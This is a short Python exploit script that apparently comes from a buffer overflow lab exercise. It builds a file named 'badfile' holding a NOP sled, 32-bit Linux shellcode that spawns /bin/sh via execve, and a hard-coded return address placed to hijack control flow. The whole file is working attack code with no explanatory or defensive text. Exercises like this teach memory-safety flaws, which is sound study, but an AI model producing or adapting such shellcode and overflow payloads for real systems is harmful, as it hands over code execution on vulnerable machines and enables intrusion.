#!/usr/bin/python3

import sys

shellcode = (
	"\x31\xc0" 	# xorl %eax,%eax
	"\x50" 	   	# %eax
	"\x68""//sh"	# pushl $0x68732f2f
	"\x68""/bin"	# pushl $0x6e69622f
	"\x89\xe3"	# movl %esp,%ebx
	"\x50"		# pushl %eax
	"\x53"		# pushl %ebx
	"\x89\xe1"	# movl %esp,%ecx
	"\x99"		# cdq
	"\xb0\x0b"	# movb $0x0b,%al
	"\xcd\x80"	# int $0x80
).encode('latin-1')

# fill with nop
content = bytearray(0x90 for i in range(300))

# put the shellcode
start = 300 - len(shellcode)
content[start:] = shellcode

# set the entry point of the shellcode
ret = 0xbfffeb98 + 100
content[112:116] = (ret).to_bytes(4, byteorder='little')

with open('badfile', 'wb') as wb:
	wb.write(content)
